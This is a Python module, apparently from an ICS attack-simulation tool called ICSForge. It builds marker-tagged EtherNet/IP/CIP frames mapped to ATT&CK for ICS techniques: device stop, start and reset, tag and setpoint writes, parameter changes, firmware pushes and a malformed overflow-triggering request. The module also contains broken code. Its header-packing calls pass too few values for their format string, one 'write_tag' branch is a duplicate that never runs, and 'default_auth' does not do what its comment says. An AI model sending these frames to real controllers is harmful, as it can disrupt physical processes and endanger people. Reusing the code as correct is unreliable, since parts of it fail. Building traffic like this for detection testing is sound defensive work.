# ICSForge EtherNet/IP (CIP over ENIP encapsulation) — upgraded for ATT&CK realism
import struct, random
from .common import marker_bytes

# ENIP encapsulation commands
CMD = {
    "list_services":      0x0004,
    "list_identity":      0x0063,
    "list_interfaces":    0x0064,
    "register_session":   0x0065,
    "unregister_session": 0x0066,
    "send_rr_data":       0x006F,  # Unconnected messaging (CIP)
    "send_unit_data":     0x0070,  # Connected messaging (I/O)
}

# CIP Service codes
CIP_SVC = {
    "get_attribute_all":    0x01,
    "set_attribute_all":    0x02,
    "get_attribute_list":   0x03,
    "get_attribute_single": 0x0E,
    "set_attribute_single": 0x10,
    "reset":                0x05,
    "start":                0x06,
    "stop":                 0x07,
    "create":               0x08,
    "delete":               0x09,
    "read_tag":             0x4C,  # EtherNet/IP tag read
    "write_tag":            0x4D,  # EtherNet/IP tag write
    "read_tag_frag":        0x52,  # Fragmented read
    "write_tag_frag":       0x53,  # Fragmented write
    "get_instance_attr":    0x55,
    "get_and_clear":        0x4E,
}

# Class IDs for CIP path
CLASS = {
    "identity":       0x01,
    "message_router": 0x02,
    "assembly":       0x04,
    "connection_mgr": 0x06,
    "file":           0x37,
    "parameter":      0x0F,
    "pos_controller": 0x25,
    "drive":          0x28,
}


def _enip_header(cmd: int, session: int, data: bytes, sender_ctx: bytes = b"ICShdr\x00\x00") -> bytes:
    """EtherNet/IP encapsulation header (24 bytes)."""
    return struct.pack("<HHIIIIQII",
        cmd,             # Command
        len(data),       # Length
        session,         # Session handle
        0,               # Status
        # SenderContext: 8 bytes
        struct.unpack("<Q", sender_ctx[:8])[0],
        0,               # Options
    )[:24]  # exactly 24 bytes


def _cip_path(class_id: int, instance: int = 1, attr: int = 0) -> bytes:
    """Build CIP logical path segment (EPATH)."""
    # Class segment: 0x20 + class_id
    # Instance segment: 0x24 + instance
    path = bytes([0x20, class_id & 0xFF, 0x24, instance & 0xFF])
    if attr:
        path += bytes([0x30, attr & 0xFF])
    word_count = len(path) // 2
    return bytes([word_count]) + path


def _cip_request(service: int, path_bytes: bytes, data: bytes = b"") -> bytes:
    """CIP Request message."""
    return bytes([service]) + path_bytes + data


def build_payload(marker: str, style: str = "list_identity", **kwargs) -> bytes:
    """
    Build EtherNet/IP frame.

    Styles:
      list_services      — T0841 Network Service Scanning
      list_identity      — T0888/T0840 Remote System Info Discovery
      list_interfaces    — T0840 Network Connection Enumeration
      register_session   — T0883 Internet Accessible Device (initial handshake)
      unregister_session — T0826 Loss of Availability (teardown)
      get_identity       CIP GetAttributeAll Identity — T0888
      get_device_type    CIP GetAttributeSingle — T0868 Detect Operating Mode
      reset_device       CIP Reset — T0816 Device Restart
      start_device       CIP Start — T0875 Change Program State
      stop_device        CIP Stop — T0813 Denial of Control / T0881
      read_tag           CIP ReadTag — T0801/T0882
      write_tag          CIP WriteTag — T0855/T0831/T0836
      get_param          CIP GetAttributeSingle Parameter — T0836
      set_param          CIP SetAttributeSingle Parameter — T0836
      send_rr_data       Generic unconnected — T0869
    """
    rnd      = random.Random(kwargs.get("seed"))
    session  = int(kwargs.get("session", rnd.randint(1, 0xFFFFFF))) & 0xFFFFFFFF
    ctx      = b"ICShdr\x00\x00"
    mb       = marker_bytes(marker)

    if style == "list_services":
        data = mb
        hdr  = struct.pack("<HHII8sI", CMD["list_services"], len(data), 0, 0, ctx, 0)
        return hdr + data

    elif style == "list_identity":
        data = mb
        hdr  = struct.pack("<HHII8sI", CMD["list_identity"], len(data), 0, 0, ctx, 0)
        return hdr + data

    elif style == "list_interfaces":
        data = mb
        hdr  = struct.pack("<HHII8sI", CMD["list_interfaces"], len(data), 0, 0, ctx, 0)
        return hdr + data

    elif style == "register_session":
        data = struct.pack("<HH", 1, 0) + mb  # protocol version=1, options=0
        hdr  = struct.pack("<HHII8sI", CMD["register_session"], len(data), 0, 0, ctx, 0)
        return hdr + data

    elif style == "unregister_session":
        hdr = struct.pack("<HHII8sI", CMD["unregister_session"], 0, session, 0, ctx, 0)
        return hdr + mb

    elif style == "get_identity":
        # GetAttributeAll on Identity class, instance 1
        path    = _cip_path(CLASS["identity"], 1)
        cip_req = _cip_request(CIP_SVC["get_attribute_all"], path) + mb
        # Interface handle=0, timeout=0, item count=2, null addr + data
        rr_data = struct.pack("<IH", 0, 2)  # ifhandle=0, timeout=0 -> then items
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)  # null address item
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req  # unconnected data
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "get_device_type":
        # GetAttributeSingle Identity class attr 2 (Product Type)
        path    = _cip_path(CLASS["identity"], 1, 2)
        cip_req = _cip_request(CIP_SVC["get_attribute_single"], path) + mb
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "reset_device":
        # CIP Reset service on Identity object
        path    = _cip_path(CLASS["identity"], 1)
        cip_req = _cip_request(CIP_SVC["reset"], path) + bytes([0x00]) + mb  # type=0 cycle power
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "stop_device":
        path    = _cip_path(CLASS["message_router"], 1)
        cip_req = _cip_request(CIP_SVC["stop"], path) + mb
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "start_device":
        path    = _cip_path(CLASS["message_router"], 1)
        cip_req = _cip_request(CIP_SVC["start"], path) + mb
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "read_tag":
        # CIP ReadTag (0x4C) for a tag by name
        tag_name = kwargs.get("tag_name", "PumpSpeed").encode()
        tag_path = bytes([len(tag_name) // 2 + (len(tag_name) % 2)]) + \
                   bytes([0x91, len(tag_name)]) + tag_name
        if len(tag_name) % 2:
            tag_path += b"\x00"
        cip_req = bytes([CIP_SVC["read_tag"]]) + tag_path + struct.pack("<H", 1) + mb
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "write_tag":
        # CIP WriteTag (0x4D) — T0855/T0831
        tag_name = kwargs.get("tag_name", "ValvePos").encode()
        tag_path = bytes([len(tag_name) // 2 + (len(tag_name) % 2)]) + \
                   bytes([0x91, len(tag_name)]) + tag_name
        if len(tag_name) % 2:
            tag_path += b"\x00"
        value   = struct.pack("<f", float(kwargs.get("value", rnd.uniform(0.0, 100.0))))
        cip_req = bytes([CIP_SVC["write_tag"]]) + tag_path + \
                  struct.pack("<HH", 0x00CA, 1) + value + mb  # type=REAL, count=1
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "get_param":
        # GetAttributeSingle on Parameter object — T0836
        inst = int(kwargs.get("instance", rnd.randint(1, 50)))
        path = _cip_path(CLASS["parameter"], inst, 1)
        cip_req = _cip_request(CIP_SVC["get_attribute_single"], path) + mb
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "set_param":
        # SetAttributeSingle on Parameter — T0836 Modify Parameter
        inst  = int(kwargs.get("instance", rnd.randint(1, 50)))
        value = struct.pack("<H", int(kwargs.get("value", rnd.randint(0, 1000))))
        path  = _cip_path(CLASS["parameter"], inst, 9)  # attr 9 = value
        cip_req = _cip_request(CIP_SVC["set_attribute_single"], path) + value + mb
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "send_rr_data":
        # Generic unconnected send — T0869 Standard Application Layer Protocol
        cip_req = bytes([CIP_SVC["get_attribute_all"], 0x02, 0x20, 0x01, 0x24, 0x01]) + mb
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "firmware_update":
        # CIP firmware download to identity object — T0839 Module Firmware / T0800 Activate FW Update Mode
        # Service 0x2C = Download to firmware object (class 0x01)
        path    = _cip_path(CLASS["identity"], 1)
        chunk   = bytes([rnd.randint(0, 0xFF) for _ in range(120)])
        cip_req = bytes([0x2C]) + path + chunk + mb
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "boot_firmware":
        # CIP reset to alternate firmware image — T0895 Autorun Image / T0857 System Firmware
        # Reset service 0x05 to identity object triggers reboot into new firmware
        path    = _cip_path(CLASS["identity"], 1)
        cip_req = bytes([CIP_SVC["reset"], 0x01, 0x20, 0x01, 0x24, 0x01, 0x01]) + mb
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "assembly_read":
        # Read assembly object (class 0x04) — T0877 I/O Image
        # Assembly objects hold the complete I/O image of the device
        inst    = int(kwargs.get("instance", rnd.randint(1, 4)))
        path    = _cip_path(CLASS["assembly"], inst)
        cip_req = bytes([CIP_SVC["get_attribute_all"]]) + path + mb
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "reset_safe":
        # CIP reset_device service — T0858 Change Operating Mode / T0816 restart
        path    = _cip_path(CLASS["identity"], 1)
        cip_req = bytes([CIP_SVC["reset"]]) + path + b"\x01" + mb  # 0x01 = out-of-box reset
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "malformed_ucmm":
        # Malformed unconnected messaging request — T0819/T0866 Exploitation
        # Crafts an invalid CIP path length to trigger buffer overflow
        bad_path = b"\x04\xFF\xFF\xFF" + b"\xCC" * 32  # invalid segment type + overflow
        cip_req  = bytes([CIP_SVC["get_attribute_all"]]) + bad_path + mb
        rr_data  = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "write_tag":
        # Write a named tag value — T0855/T0831 Unauthorized Command / Manipulation
        tag_name = kwargs.get("tag_name", b"SETPOINT_01")
        if isinstance(tag_name, str):
            tag_name = tag_name.encode()
        value    = struct.pack("<f", float(kwargs.get("value", rnd.uniform(0.0, 100.0))))
        # CIP write tag service: service 0x4D + ANSI symbol segment
        symbol   = b"\x91" + bytes([len(tag_name)]) + tag_name
        if len(symbol) % 2: symbol += b"\x00"
        word_cnt = len(symbol) // 2
        path     = bytes([word_cnt]) + symbol
        cip_req  = bytes([CIP_SVC["write_tag"]]) + path + struct.pack("<HH", 0xCA, 1) + value + mb
        rr_data  = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "tool_transfer":
        # Large fragmented read/write — T0867 Lateral Tool Transfer
        # Encodes attacker tool as fragmented CIP write
        blob    = bytes([rnd.randint(0x20, 0x7E) for _ in range(200)])
        path    = _cip_path(CLASS["file"], 1)
        cip_req = bytes([CIP_SVC["write_tag_frag"]]) + path + blob + mb
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    elif style == "default_auth":
        # Register session with vendor default — T0812 Default Credentials
        # EtherNet/IP has no authentication in session layer; this probes auth at application layer
        data = struct.pack("<HH", 1, 0) + mb  # version=1, options=0
        hdr  = struct.pack("<HHII8sI", CMD["register_session"], len(data), 0, 0, ctx, 0)
        return hdr + data

    elif style == "c2_beacon":
        # send_rr_data with encoded C2 value in attribute write — T0869/T0885
        path    = _cip_path(CLASS["parameter"], rnd.randint(1, 50))
        value   = struct.pack("<I", rnd.randint(0xDEAD0000, 0xDEADFFFF))
        cip_req = bytes([CIP_SVC["set_attribute_single"]]) + path + value + mb
        rr_data = struct.pack("<IH", 0, 2)
        rr_data += struct.pack("<HHH", 0x0000, 0, 0)
        rr_data += struct.pack("<HH", 0x00B2, len(cip_req)) + cip_req
        hdr = struct.pack("<HHII8sI", CMD["send_rr_data"], len(rr_data), session, 0, ctx, 0)
        return hdr + rr_data

    else:
        # Fallback: list_identity
        data = mb
        hdr  = struct.pack("<HHIIIIQII",
            CMD["list_identity"], len(data), 0, 0,
            struct.unpack("<Q", ctx)[0], 0)[:24]
        return hdr + data
